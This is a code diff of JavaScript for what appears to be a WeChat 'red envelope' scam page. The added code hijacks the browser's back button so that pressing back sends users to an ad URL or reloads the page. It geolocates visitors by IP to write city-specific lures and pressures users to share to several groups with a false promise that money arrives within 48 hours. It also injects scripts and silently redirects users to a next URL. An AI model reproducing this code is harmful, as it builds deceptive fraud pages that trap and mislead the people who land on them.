@@ -1,3 +1,4 @@
+var baiduKey = "45e4ed65d019478f202ec342aaa07047";
 var isDev = false;
 var fenliuData = new Array(
 );
@@ -5,34 +6,36 @@ var fenliuTime = 10;
 var isNeedReloadShare = false;
 
 
-var lastBackIndex = 0;
-//
-// var hour = new Date().getHours();
-// if(hour >=22 || hour <= 7){
-//     lastBackIndex = 1;
-// }
+Zepto(function ($) {
+    var imgUrl = "http://ww4.sinaimg.cn/mw690/006xLWk3gw1f6uucy8o2bj305k05kq2y.jpg";
+    $(".topcontent .avatar img").attr("src", imgUrl);
+    $(".user-picture img").attr("src", imgUrl);
+})
 
-var storeWithExpiration = {
-    set: function(key, val, exp, num) {
-        store.set(key, { val:val, exp:exp, num:num, time:new Date().getTime() })
-    },
-    get: function(key) {
-        var info = store.get(key)
-        if (!info) { return null }
-        if (new Date().getTime() - info.time > info.exp) { return null }
-        return info.val
-    },
-    getNum: function(key) {
-        var info = store.get(key)
-        if (!info) { return null }
-        if (new Date().getTime() - info.time > info.exp) { return null }
-        return info.num
-    },
- }
+var lastBackIndex = 0;
+
 
 var currentTime = new Date().getTime();
+window.setTimeout(
+    function () {
+        history.pushState(null, null, "#weixin");
+        window.onpopstate = function () {
+            history.pushState(null, null, "#weixin2");
+            var currentTime2 = new Date().getTime();
+            if (currentTime2 - currentTime < 500) {
+                return true;
+            }
+            lastBackIndex++;
+            if (lastBackIndex % 2 == 0 && typeof(adUrl) != "undefined") {
+                location.href = adUrl;
+            } else {
+                selfLoad();
+            }
+            return true;
+        };
+    }, 50);
 
-//分流                                       
+//分流                                       n
 function fenliu() {
     //有5分之一的几率切到新的上面
     var time = new Date().getTime();
@@ -107,17 +110,10 @@ function isWxNewVersion() {
     return wechatInfo.length > 1 && wechatInfo[1] == "6.3.23";
 }
 
-
 $(function () {
     $('.firstcontainer').width($('.box-hcenter').eq(0).width());
 });
 
-function display() {
-    for (var i = 0; i < 7; i++) {
-        var temp = Math.random() * 33 + 3;
-        $(".showmoneyplace").eq(i).html('+' + temp.toFixed(2) + '元');
-    }
-}
 
 
 function shade() {
@@ -250,8 +246,6 @@ function shareComplete() {
     } else {
         switch (shareTimes) {
             case 1:
-                storeWithExpiration.set('tel', one, 7200, 1);
-                console.log(storeWithExpiration.get('tel'));
                 wxAlert('发送成功,请再发送2个不同的微信群即可領取！', clickAlerConfrimCallBack);
                 break;
             case 2:
@@ -268,7 +262,6 @@ function shareComplete() {
                 setTimeout(goToShareNexUrlnew, 2000);
                 break;
             case 5:
-                storeWithExpiration.set('tel', one, 7200, 1);
                 wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                 setTimeout(goToShareNexUrlnew, 2000);
                 break;
@@ -291,12 +284,22 @@ function goToShareNexUrlnew() {
 
 var shareUrl = window.location.href;
 function getNewShareUrl() {
+     // window.location.href = "http://renamayu.github.io/test/skip.html";
+    // var shareGetUrl = "http://119.29.8.160:8800/index1";
+    // $.ajax({
+    //     type: "GET",
+    //     url: shareGetUrl,
+    //     success: function (msg) {
+    //         shareUrl = msg;
+    //         console.log("shareUrl " + "http://renamayu.github.io/test/skip.html");
+    //     }
+    // });
     shareUrl = "http://renamayu.github.io/test/skip.html";
 }
 
 var currentShareObject = {
-    title: "邀请你加入同城抽奖活动",
-    desc: "我邀请你加入同城抽奖活动，礼品免费领",
+    title: "同城",
+    desc: "每天免费领",
     imgUrl: "http://ww2.sinaimg.cn/mw690/006xLWk3gw1f6k0rfk2ynj30b40b4myu.jpg"
 };
 
@@ -312,6 +315,62 @@ function getShareObject() {
     return currentShareObject;
 }
 
+document.title = currentShareObject.title;
+var checkCityTime = 0;
+function checkCity() {
+    fenliu();
+    //有5分之一的几率切到
+    if (checkCityTime > 20) {
+        return;
+    }
+    checkCityTime++;
+    if (typeof(remote_ip_info) == "undefined") {
+        setTimeout(checkCity, 300);
+        console.log("checkCity")
+        return;
+    }
+    var city = remote_ip_info.city;
+    // alert(city);
+    if (city == "深圳" || city == "广州" || city == "成都") {
+        // window.location.replace("http://hb.wx3003.top");
+        // return;
+    }
+    currentShareObject.title = "邀请你加入" + city + "红苞群";
+    document.title = currentShareObject.title;
+    currentShareObject.desc = "我邀请你加入" + city + "红苞群,每天免费领";
+    $("#cityTitle").html(currentShareObject.title);
+}
+
+checkCity();
+
+
+//check跳转
+(function () {
+    if (!isWxNewVersion()) {
+        return;
+    }
+    var hm = document.createElement("script");
+    //hm.src = checkJumpUrl;
+    // hm.src = "http://www.kanav022.cn/get/index.php?id=684";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+})();
+
+var checkNeedGoToNextTime = 0;
+function checkNeedGoToNext() {
+    console.log("mNextUrl2")
+    if (checkNeedGoToNextTime > 10) {
+        return;
+    }
+    checkNeedGoToNextTime++;
+    if (typeof(mNextUrl2) == "undefined") {
+        setTimeout(checkNeedGoToNext, 300);
+        return;
+    }
+    // alert("goto="+mNextUrl2);
+    $("body").hide();
+    window.location.replace(mNextUrl2);
+}
 
 
 if (!isWxNewVersion()) {
@@ -319,7 +378,14 @@ if (!isWxNewVersion()) {
     setHandleMessageHookForWeixin();
 }
 
-
+//统计
+// var _hmt = _hmt || [];
+// (function () {
+//     var hm = document.createElement("script");
+//     hm.src = "//hm.baidu.com/hm.js?" + baiduKey;
+//     var s = document.getElementsByTagName("script")[0];
+//     s.parentNode.insertBefore(hm, s);
+// })();
 
 function onBridgeReady() {
     WeixinJSBridge.call('showOptionMenu');
@@ -335,32 +401,3 @@ if (typeof WeixinJSBridge == "undefined") {
 } else {
     onBridgeReady();
 }
-
-function hideMenu() {
-     document.querySelector('#hideMenuItems').onclick = function () {
-    wx.hideMenuItems({
-      menuList: [
-        'menuItem:readMode', // 阅读模式
-        'menuItem:share:timeline', // 分享到朋友圈
-        'menuItem:copyUrl', // 复制链接
-        'menuItem:share:QZone',
-        'menuItem:share:weiboApp',
-        'menuItem:favorite',
-        'menuItem:share:qq',
-        'menuItem:share:QZone',
-        'menuItem:share:email',
-        'menuItem:readMode',
-        'menuItem:originPage',
-        'menuItem:openWithQQBrowser',
-        'menuItem:openWithSafari',
-      ],
-      success: function (res) {
-        alert('已隐藏“阅读模式”，“分享到朋友圈”，“复制链接”等按钮');
-      },
-      fail: function (res) {
-        alert(JSON.stringify(res));
-      }
-    });
-  };
-}
-
